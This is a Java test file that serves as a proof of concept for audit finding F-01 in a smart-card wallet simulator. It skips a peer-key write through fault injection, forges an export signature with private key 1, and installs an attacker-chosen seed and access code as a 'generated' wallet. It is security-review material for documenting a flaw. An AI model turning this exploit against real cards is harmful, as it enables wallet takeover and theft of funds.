// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review2;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.math.BigInteger;
import java.util.Arrays;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.qntx.card.sim.Fault;

/**
 * PoC for finding F-01, IMPORT direction (spec section 9.14): on a BLANK card the peer-key slot
 * still holds the base point G from Transfer.initDomains, so skipping Transfer.setPeer lets an
 * export signature made with private key 1 verify, and the attacker's own seed is installed as a
 * "generated" wallet.
 */
final class PeerSlotImportTest {
    private static final Ca2 CA = Ca2.INSTANCE;
    private static final byte[] SEED_ATT = H2.sha512(H2.ascii("review2 import seed"));
    private static final byte[] ACCESS_ATT = H2.sha256(H2.ascii("review2 import code"));
    private static final byte[] EMPTY = new byte[0];

    @AfterEach
    void disarm() {
        Fault.reset();
    }

    private static final class Fixture {
        final Card2 card = new Card2();
        final Session2 session;
        final Peer2 source;
        final byte[] lkT; // link public key of the target's offer
        final BigInteger e; // attacker's ephemeral scalar
        final byte[] ep; // E = e * G, uncompressed
        final byte[] m; // the export message of spec section 9.14
        final byte[] sigS; // ECDSA over M made with private key 1

        Fixture() {
            card.blank(CA);
            session = card.open(CA);
            source = Peer2.create(CA);
            Session2.Res offer = session.cmd(0x40, 0x00, 0x00, EMPTY);
            assertEquals(0x9000, offer.sw, () -> "OFFER sw " + Integer.toHexString(offer.sw));
            assertEquals(129, offer.data.length);
            lkT = Arrays.copyOfRange(offer.data, 0, 65);
            byte[] sigT = Arrays.copyOfRange(offer.data, 65, 129);
            assertTrue(
                    H2.verify(card.identity(), H2.cat(H2.ascii("qntx-card/v1/offer"), lkT), sigT),
                    "offer signature does not verify under the card key");
            e = H2.randomScalar();
            ep = H2.uncompressed(H2.SECP.getG().multiply(e).normalize());
            m = H2.cat(H2.ascii("qntx-card/v1/export"), source.a, card.identity(), lkT, ep);
            sigS = H2.sign(BigInteger.ONE, m);
        }

        byte[] importBegin() {
            return H2.cat(source.cert, ep, sigS);
        }
    }

    @Test
    void controlRefusedWithoutFault() {
        assertTrue(H2.bip32MasterValid(SEED_ATT));
        Fixture f = new Fixture();
        Session2.Res r = f.session.cmd(0x42, 0x00, 0x00, f.importBegin());
        assertEquals(0x6A80, r.sw, () -> "IMPORT P1=00 sw " + Integer.toHexString(r.sw));
    }

    @Test
    void skippedPeerWriteInstallsAttackerSeed() {
        assertTrue(H2.bip32MasterValid(SEED_ATT));
        Fixture f = new Fixture();

        Fault.armSkip("Transfer.setPeer", 1);
        Session2.Res r0;
        int setPeerCalls;
        try {
            r0 = f.session.cmd(0x42, 0x00, 0x00, f.importBegin());
            setPeerCalls = Fault.calls("Transfer.setPeer");
        } finally {
            Fault.reset();
        }
        assertEquals(0x9000, r0.sw, () -> "IMPORT P1=00 sw " + Integer.toHexString(r0.sw));
        assertEquals(0, r0.data.length);
        System.out.println(
                "F-01 IMPORT P1=00 faulted: sw="
                        + Integer.toHexString(r0.sw)
                        + " setPeerCalls="
                        + setPeerCalls);
        assertTrue(setPeerCalls >= 1, "Transfer.setPeer was never reached");

        // spec section 9.14: the card kept K_te, K_tm and ID(A_S) as the pending import;
        // the host knows Z = x(e * LK_T) and TH = SHA-256(M)
        byte[] z =
                H2.big32(
                        H2.point(f.lkT).multiply(f.e).normalize().getAffineXCoord().toBigInteger());
        byte[] keys = H2.kdf(z, "qntx-card/v1/kdf-transfer", H2.sha256(f.m), 32);
        byte[] kte = Arrays.copyOfRange(keys, 0, 16);
        byte[] ktm = Arrays.copyOfRange(keys, 16, 32);
        // payload = origin(0x01 "generated") || seed || accessHash_T || c || IDs
        byte[] payload =
                H2.cat(
                        new byte[] {0x01},
                        SEED_ATT,
                        ACCESS_ATT,
                        new byte[] {0x02},
                        f.source.id(),
                        H2.cardId(f.card.identity()));
        byte[] ct = H2.cbc(true, kte, new byte[16], H2.m2(payload));
        byte[] tag = H2.cmac(ktm, ct);

        Session2.Res r1 = f.session.cmd(0x42, 0x01, 0x00, H2.cat(ct, tag));
        assertEquals(0x9000, r1.sw, () -> "IMPORT P1=01 sw " + Integer.toHexString(r1.sw));
        // WalletInfo = masterPublicKey(33) || origin || c || IDs
        assertEquals(67, r1.data.length);
        boolean mpkIsAttacker =
                Arrays.equals(H2.bip32MasterPub(SEED_ATT), Arrays.copyOf(r1.data, 33));
        System.out.println(
                "F-01 IMPORT P1=01: sw="
                        + Integer.toHexString(r1.sw)
                        + " installedMpk="
                        + H2.hex(Arrays.copyOf(r1.data, 33))
                        + " origin=0x"
                        + Integer.toHexString(r1.data[33] & 0xFF)
                        + " c="
                        + (r1.data[34] & 0xFF)
                        + " mpkIsAttackerSeed="
                        + mpkIsAttacker);
        assertTrue(mpkIsAttacker, "installed masterPublicKey is not the attacker seed's");
        assertEquals(0x01, r1.data[33] & 0xFF, "origin is not 'generated'");
        assertEquals(0x02, r1.data[34] & 0xFF, "c is not 2");
        assertArrayEquals(f.source.id(), Arrays.copyOfRange(r1.data, 35, 51));
        assertArrayEquals(H2.cardId(f.card.identity()), Arrays.copyOfRange(r1.data, 51, 67));

        // the installed wallet answers to the attacker's access code in a new session
        Session2 s2 = f.card.open(CA);
        Session2.Res verify = s2.cmd(0x22, 0x00, 0x00, ACCESS_ATT);
        assertEquals(0x9000, verify.sw, () -> "VERIFY sw " + Integer.toHexString(verify.sw));
        Session2.Res status = s2.cmd(0x20, 0x00, 0x00, EMPTY);
        assertEquals(0x9000, status.sw);
        assertArrayEquals(new byte[] {0x02, 0x0A}, status.data, "STATUS is not LOADED, 10");
        System.out.println(
                "F-01 post-import: verifySw="
                        + Integer.toHexString(verify.sw)
                        + " status="
                        + H2.hex(status.data));
    }
}
